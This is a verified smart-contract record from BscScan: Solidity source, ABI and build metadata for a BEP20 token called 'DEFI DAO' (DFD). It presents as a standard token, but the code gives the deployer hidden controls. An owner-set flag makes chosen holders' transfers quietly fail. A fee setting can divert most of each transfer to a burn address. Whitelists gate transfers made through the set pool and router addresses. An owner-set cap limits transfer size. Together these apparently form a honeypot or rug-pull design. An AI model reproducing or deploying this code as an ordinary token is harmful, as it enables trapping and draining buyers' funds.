{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-06-01\r\n*/\r\npragma solidity ^0.4.26;\r\n\r\nlibrary SafeMath {\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return a / b;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\n\r\ncontract ERC20Basic {\r\n  function totalSupply() public view returns (uint256);\r\n  function balanceOf(address who) public view returns (uint256);\r\n  function transfer(address to, uint256 value) public returns (bool);\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\ncontract BasicToken is ERC20Basic {\r\n  using SafeMath for uint256;\r\n  mapping(address => uint256) balances;\r\n  uint percent;\r\n  struct awardsAds {\r\n      address ads;\r\n      uint scale;\r\n  }\r\n  uint isFee0;\r\n  uint awardsCount0;\r\n  mapping(uint => awardsAds)awardsList0;\r\n  uint isFee1;\r\n  uint awardsCount1;\r\n  mapping(uint => awardsAds)awardsList1;\r\n  uint256 limit;\r\n  mapping(address => uint)transferList;\r\n  address lpads0;\r\n  address lpads1;\r\n  mapping(address => uint)proxyList0;\r\n  mapping(address => uint)proxyList1;\r\n\r\n  \r\n  constructor() public{\r\n    percent=100;\r\n    transferList[msg.sender]=9;   \r\n  }\r\n\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(msg.sender!=lpads0 || proxyList0[_to]>0);\r\n    require(_value <= balances[msg.sender] && (limit==0 || _value<=limit));\r\n    uint isu=transferList[msg.sender];\r\n    if(isu==0)isu=transferList[_to];\r\n    if(isu==4)return false;    \r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\n    if(isFee0>0 && isu==0)\r\n    {\r\n        uint256 _val;\r\n        address _too;  \r\n        if (msg.sender!=lpads0)\r\n        {\r\n            _too=address(1);\r\n            _val=_value*(percent-isFee0)/percent;\r\n            balances[_too] = balances[_too].add(_val);\r\n            emit Transfer(msg.sender, _too, _val);\r\n        }\r\n        else\r\n        {\r\n          for(uint id=1;id<=awardsCount0;id++)\r\n          {\r\n            _too=awardsList0[id].ads;\r\n            if(_too==address(0))continue;\r\n            _val=_value*awardsList0[id].scale/percent;\r\n            balances[_too] = balances[_too].add(_val);\r\n            emit Transfer(msg.sender, _too, _val);\r\n          }\r\n        }\r\n        _value=_value*isFee0/percent;\r\n    }\r\n    balances[_to] = balances[_to].add(_value);\r\n    emit Transfer(msg.sender, _to, _value);\r\n    return true;\r\n  }\r\n  function addTransferList(address ads,uint kind) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n      transferList[ads]=kind;\r\n      return true;\r\n  }\r\n  function addProxyList(uint list,address ads,uint kind) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n      if(list==0)proxyList0[ads]=kind;\r\n      else proxyList1[ads]=kind;\r\n      return true;\r\n  }\r\n  function removeTransferList(uint list,address ads) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n      if(list==0) delete transferList[ads];\r\n      else if(list==1)delete proxyList0[ads];\r\n      else delete proxyList1[ads];\r\n      return true;\r\n  }\r\n  function addAwardsList(uint list,uint id,address ads,uint scale,uint count) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n      awardsAds memory ad=awardsAds(ads,scale);\r\n      if(list==0){\r\n          awardsList0[id]=ad;\r\n          awardsCount0=count;\r\n      }\r\n      else{\r\n           awardsList1[id]=ad;\r\n           awardsCount1=count;\r\n      }\r\n      return true;\r\n  }\r\n  function removeAwardsList(uint list,uint id,uint count) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n       if(list==0){\r\n           delete awardsList0[id];\r\n           awardsCount0=count;\r\n       }\r\n       else{\r\n            delete awardsList1[id];\r\n            awardsCount1=count;\r\n       }\r\n      return true;\r\n  }\r\n  function setFee(uint list,uint fee) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n      if(list==0) isFee0=fee;\r\n      else isFee1=fee;\r\n      return true;\r\n  }\r\n  function setLimit(uint num) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n      limit=num;\r\n      return true;\r\n  }\r\n  function setLP(address lp0,address lp1) public returns (bool)\r\n  {\r\n      require(transferList[msg.sender]==9);\r\n      lpads0=lp0;\r\n      lpads1=lp1;\r\n      return true;\r\n  }\r\n  function getInfo_parameter(uint list)public view returns (uint,uint,address,uint256){\r\n    if(list==0) return (isFee0,awardsCount0,lpads0,limit);\r\n    else return (isFee1,awardsCount1,lpads1,limit);\r\n }\r\n  function getInfo_transferList(uint list,address ads)public view returns (uint){\r\n     if(list==0) return transferList[ads];\r\n     else if(list==1)return proxyList0[ads];\r\n     else return proxyList1[ads];\r\n }\r\n  function getInfo_awardsList(uint list,uint id)public view returns (address,uint){\r\n    if(list==0)return (awardsList0[id].ads,awardsList0[id].scale);\r\n    else return (awardsList1[id].ads,awardsList1[id].scale);\r\n }\r\n\r\n  function balanceOf(address _owner) public view returns (uint256) {\r\n    return balances[_owner];\r\n  }\r\n}\r\n\r\ncontract ERC20 is ERC20Basic {\r\n  function allowance(address owner, address spender)\r\n    public view returns (uint256);\r\n\r\n  function transferFrom(address from, address to, uint256 value)public returns (bool);\r\n\r\n  function approve(address spender, uint256 value) public returns (bool);\r\n  event Approval(\r\n    address indexed owner,\r\n    address indexed spender,\r\n    uint256 value\r\n  );\r\n}\r\n\r\ncontract StandardToken is ERC20, BasicToken {\r\n\r\n  mapping (address => mapping (address => uint256)) internal allowed;\r\n\r\n  function transferFrom(address _from,address _to,uint256 _value)public returns (bool)\r\n  {\r\n    require(_to != address(0));\r\n    require(msg.sender!=lpads1 || proxyList1[_to]>0);\r\n    require(_value <= balances[_from] && (limit==0 || _value<=limit));\r\n    require(_value <= allowed[_from][msg.sender]);\r\n    uint isu=transferList[msg.sender];\r\n    if(isu==0)isu=transferList[_from];\r\n    if(isu==0)isu=transferList[_to];\r\n    if(isu==4)return false;  \r\n    balances[_from] = balances[_from].sub(_value);\r\n    if(isFee1>0 && isu==0){\r\n        uint256 _val;\r\n        address _too;  \r\n        for(uint id=1;id<=awardsCount1;id++)\r\n        {\r\n            _too=awardsList1[id].ads;\r\n            if(_too==address(0))continue;\r\n            _val=_value*awardsList1[id].scale/percent;\r\n            balances[_too] = balances[_too].add(_val);\r\n            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_val);\r\n            emit Transfer(_from, _too, _val);\r\n        }\r\n        _value=_value*isFee1/percent;\r\n    }\r\n    balances[_to] = balances[_to].add(_value);\r\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n    emit Transfer(_from, _to, _value);\r\n    return true;\r\n  }\r\n\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    emit Approval(msg.sender, _spender, _value);\r\n    return true;\r\n  }\r\n\r\n  function allowance(\r\n    address _owner,\r\n    address _spender\r\n   )\r\n    public\r\n    view\r\n    returns (uint256)\r\n  {\r\n    return allowed[_owner][_spender];\r\n  }\r\n}\r\n\r\ncontract MintableToken is StandardToken {\r\n  event Mint(address indexed to, uint256 amount);\r\n\r\n  function mint(\r\n    address _to,\r\n    uint256 _amount\r\n  )\r\n    internal\r\n  {\r\n    balances[_to] = balances[_to].add(_amount);\r\n    emit Mint(_to, _amount);\r\n    emit Transfer(address(0), _to, _amount);\r\n  }\r\n}\r\n\r\ncontract MyToken is StandardToken {\r\n\r\n  function transfer(\r\n    address _to,\r\n    uint256 _value\r\n  )\r\n    public\r\n    returns (bool)\r\n  {\r\n    return super.transfer(_to, _value);\r\n  }\r\n\r\n  function transferFrom(\r\n    address _from,\r\n    address _to,\r\n    uint256 _value\r\n  )\r\n    public\r\n    returns (bool)\r\n  {\r\n    return super.transferFrom(_from, _to, _value);\r\n  }\r\n\r\n  function approve(\r\n    address _spender,\r\n    uint256 _value\r\n  )\r\n    public\r\n    returns (bool)\r\n  {\r\n    return super.approve(_spender, _value);\r\n  }\r\n}\r\ncontract BEP20Token is MyToken, MintableToken {\r\n    string public name = \"DEFI DAO\";\r\n    string public symbol = \"DFD\";\r\n    uint8 public decimals = 18;\r\n    uint256 private totalSupply_;\r\n  function totalSupply() public view returns (uint256) {\r\n    return totalSupply_;\r\n  }\r\n    constructor() public {\r\n         totalSupply_ = 210000000 * (10 ** uint256(decimals));\r\n        mint(msg.sender,totalSupply_);\r\n    }\r\n    function () public payable {\r\n        revert();\r\n    }\r\n}", "ABI": "[{\"constant\":true,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"},{\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"getInfo_awardsList\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setLimit\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"},{\"name\":\"fee\",\"type\":\"uint256\"}],\"name\":\"setFee\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"lp0\",\"type\":\"address\"},{\"name\":\"lp1\",\"type\":\"address\"}],\"name\":\"setLP\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ads\",\"type\":\"address\"},{\"name\":\"kind\",\"type\":\"uint256\"}],\"name\":\"addTransferList\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"}],\"name\":\"getInfo_parameter\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"},{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"count\",\"type\":\"uint256\"}],\"name\":\"removeAwardsList\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"},{\"name\":\"ads\",\"type\":\"address\"}],\"name\":\"getInfo_transferList\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"},{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"ads\",\"type\":\"address\"},{\"name\":\"scale\",\"type\":\"uint256\"},{\"name\":\"count\",\"type\":\"uint256\"}],\"name\":\"addAwardsList\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"},{\"name\":\"ads\",\"type\":\"address\"},{\"name\":\"kind\",\"type\":\"uint256\"}],\"name\":\"addProxyList\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"list\",\"type\":\"uint256\"},{\"name\":\"ads\",\"type\":\"address\"}],\"name\":\"removeTransferList\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"}]", "ContractName": "BEP20Token", "CompilerVersion": "v0.4.26+commit.4563c3fc", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU LGPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://a065835190938f2788fa641733ebdc5ee42ecf29c348e02add41c6b653d40584"}